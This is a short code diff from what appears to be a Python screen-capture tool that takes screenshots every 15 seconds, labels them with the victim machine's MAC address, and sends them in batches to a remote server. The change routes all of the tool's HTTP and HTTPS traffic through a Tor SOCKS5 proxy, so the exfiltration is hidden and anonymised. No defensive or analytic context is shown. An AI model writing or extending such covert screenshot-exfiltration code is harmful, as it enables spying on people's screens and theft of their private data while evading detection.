@@ -7,11 +7,12 @@ from contextlib import ExitStack # to close screenshots properly
 from datetime import datetime, timezone # to classify screenshots by time sent
 from getmac import get_mac_address # to get mac address
 
-# URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the screenshots to
-URL = 'http://10.0.2.2:8000'
+URL = 'http://10.0.2.2:8000' # the URL/IP to which you want to send the logs to
 SCREENSHOT_INTERVAL = 15.0 # Interval between taking screenshots (in seconds).
 SEND_COUNT = 2 # How many screenshots need to be taken before sending.
 MAC = get_mac_address().replace(':', '') # store mac address
+os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
+os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^
 
 screenshots = []
 # Make sure the screenshot&send count combo don't make the sending interval
